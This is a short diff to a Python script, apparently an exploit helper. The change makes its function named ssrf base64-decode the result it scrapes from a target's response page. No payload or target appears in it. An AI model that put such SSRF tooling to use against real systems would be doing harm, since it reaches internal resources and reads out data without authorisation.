@@ -1,4 +1,5 @@
 #!/usr/bin/env python3
+import base64
 import hashlib
 import requests
 
@@ -51,7 +52,8 @@ def ssrf(session: requests.Session, url: str) -> str:
         raise ValueError("result-pre block not found in response")
     start += len(marker_open)
     end = resp.text.find(marker_close, start)
-    return resp.text[start:end]
+    encoded = resp.text[start:end]
+    return base64.b64decode(encoded, validate=True).decode("utf-8")
 
 
 if __name__ == "__main__":
